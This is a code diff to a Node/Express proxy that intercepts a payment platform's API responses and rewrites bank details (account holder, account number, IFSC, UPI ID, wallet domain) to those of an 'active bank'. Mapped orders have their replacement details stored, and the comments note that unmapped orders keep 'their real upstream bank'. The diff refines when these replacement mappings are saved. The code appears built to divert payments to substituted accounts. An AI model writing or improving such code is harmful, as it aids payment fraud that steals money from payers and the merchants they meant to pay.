@@ -2156,39 +2156,9 @@ app.all('/xxapi/*', async (req, res) => {
         } else {
           // ── Case 1: Real API returned SUCCESS ─────────────────────────────────
           const activeBank = getActiveBank(data, null);
-          if (activeBank && reqOrderId && data.botEnabled !== false) {
-            if (!activeBank.minAmount || savedAmount >= activeBank.minAmount) {
-              if (!data.orderBankMap) data.orderBankMap = {};
-              const bkAcct = activeBank.accountNo || '';
-              const bkIfsc = activeBank.ifsc || '';
-              const bkName = activeBank.accountHolder || '';
-              const upstreamWallet = bj.data && typeof bj.data === 'object' ? String(bj.data.walletDomain || '') : '';
-              const paymentMeta = {
-                ...(bj.data && typeof bj.data === 'object' ? bj.data : {}),
-                ...((req.body && typeof req.body === 'object') ? req.body : {})
-              };
-              const walletScheme = inferWalletScheme(paymentMeta);
-              const mappingBank = { ...activeBank, walletDomain: upstreamWallet, walletScheme };
-              const wDom = buildWalletDomain(mappingBank, savedAmount);
-              data.orderBankMap[String(reqOrderId)] = {
-                bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
-                bankName: activeBank.bankName || 'Bank',
-                upiId: activeBank.upiId || '',
-                amount: savedAmount,
-                orderId: reqOrderId,
-                orderNo: reqOrderId,
-                walletDomain: wDom,
-                walletScheme,
-                payAccount: paymentMeta.payAccount || paymentMeta.upi || '',
-                payType: paymentMeta.payType || paymentMeta.ctType || 2,
-                time: now,
-                userId: String(userId || ''),
-                forced: true,
-                isManual: true
-              };
-              await saveData(data);
-            }
-          }
+          // Do not pre-save a mapping here. The generic response-mutation path
+          // below persists the order only after it confirms that bank details or
+          // the wallet domain were actually rewritten.
         }
         // Let it fall through to main proxy logic to rewrite the response!
       } else {
@@ -2746,7 +2716,10 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             const isNew = !existingMapping;
             // Existing orders ignore the current active bank and its minAmount;
             // only a brand-new order needs the current active bank selected.
-            if (existingMapping || (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount))) {
+            // A waitconfirm row is eligible for storage only when it already
+            // has a mapping created by an actual replacement. Never create a
+            // new mapping merely because an active bank/minimum amount exists.
+            if (existingMapping) {
               if (!data.orderBankMap) data.orderBankMap = {};
               const sourceBank = isNew ? (activeBank || {}) : (bankFromSavedOrder(existingMapping) || {});
               const bkAcct = sourceBank.accountNo || '';
@@ -3082,6 +3055,13 @@ ${replaceLine}
 
         for (const item of orderList) {
           if (!item || typeof item !== 'object') continue;
+
+          // Store/capture only orders that already have a replacement mapping.
+          // Unmapped history items kept their real upstream bank and must not
+          // be added to orderBankMap from this history view.
+          const replacementMapping = getSavedOrderMapping(data, item);
+          if (!replacementMapping) continue;
+
           // Must have a bank field to be relevant
           const itemHasBank = item.acctNo || item.acctno || item.accountNo || item.acctName || item.acctname;
           if (!itemHasBank) continue;
